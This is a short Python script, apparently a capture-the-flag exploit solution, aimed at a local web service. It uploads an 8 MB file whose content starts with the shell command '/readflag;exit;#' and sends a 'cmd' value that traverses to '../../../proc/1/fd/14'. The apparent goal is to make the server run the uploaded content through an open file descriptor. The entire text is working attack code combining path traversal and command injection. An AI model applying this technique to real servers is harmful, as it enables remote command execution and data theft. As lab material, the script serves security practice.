import httpx

URL = "http://127.0.0.1:38354"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url)
    def home(self, cmd):
        return self.c.post("/", data={
            "cmd": cmd,
        }, files={
            "test": ('x',b'/readflag;exit;#'+b'A'*1024*1024*8)
        })
class API(BaseAPI):
    ...

if __name__ == "__main__":
    api = API()
    for i in range(1,20):
        res = api.home(f"../../../proc/1/fd/14")
        print(res.text)
